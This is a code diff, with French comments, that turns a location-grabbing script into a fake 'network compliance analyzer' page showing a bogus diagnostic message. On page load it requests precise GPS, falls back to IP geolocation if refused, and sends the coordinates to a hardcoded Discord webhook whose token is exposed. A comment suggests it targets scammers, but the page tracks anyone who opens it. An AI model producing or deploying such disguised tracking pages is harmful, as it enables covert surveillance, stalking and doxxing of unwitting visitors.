@@ -1,23 +1,23 @@
-async function gatherData() {
-    // 1. Demande de position GPS précise
-    if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(async (position) => {
-            const lat = position.coords.latitude;
-            const lon = position.coords.longitude;
-            const accuracy = position.coords.accuracy;
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <title>Analyseur de Conformité Réseau</title>
+    <style>
+        body { background-color: #0d1117; color: #58a6ff; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .box { border: 1px solid #30363d; padding: 20px; background: #161b22; border-radius: 5px; text-align: center; width: 80%; max-width: 400px; }
+    </style>
+</head>
+<body>
 
-            // Préparation du message avec coordonnées exactes
-            const gpsLink = `https://www.google.com/maps?q=${lat},${lon}`;
-            
-            await sendToDiscord(gpsLink, `Précision: ${accuracy} mètres`, lat, lon);
-        }, async (error) => {
-            // Si l'arnaqueur refuse le GPS, on prend quand même son IP
-            console.log("GPS Refusé, passage à l'IP...");
-            const ipData = await fetch('https://ipapi.co/json/').then(res => res.json());
-            await sendToDiscord("GPS Refusé", "Basé sur IP", ipData.latitude, ipData.longitude);
-        }, { enableHighAccuracy: true, timeout: 5000 });
-    }
-}
+<div class="box">
+    <h2>DIAGNOSTIC EN COURS...</h2>
+    <p id="status">Initialisation du tunnel sécurisé...</p>
+</div>
+
+<script>
+// --- CONFIGURATION ---
+const webhook = "https://discord.com/api/webhooks/1406320274206490685/T5UlsYLa2A-ZUGfItLh6Uai053DnYNhbOsF0agE-gngh0DJuQDxt7sWRridLKNi1M5XP";
 
 async function sendToDiscord(mapLink, details, lat, lon) {
     const payload = {
@@ -40,3 +40,27 @@ async function sendToDiscord(mapLink, details, lat, lon) {
     });
 }
 
+async function gatherData() {
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(async (position) => {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            const accuracy = position.coords.accuracy;
+            const gpsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+            
+            await sendToDiscord(gpsLink, `Précision: ${accuracy} mètres`, lat, lon);
+            document.getElementById('status').innerText = "Vérification terminée.";
+        }, async (error) => {
+            // Repli sur IP si refus
+            const ipData = await fetch('https://ipapi.co/json/').then(res => res.json());
+            await sendToDiscord("GPS Refusé", "Basé sur IP", ipData.latitude, ipData.longitude);
+            document.getElementById('status').innerText = "Erreur de synchro 0x882.";
+        }, { enableHighAccuracy: true, timeout: 10000 });
+    }
+}
+
+// Lancement
+gatherData();
+</script>
+</body>
+</html>
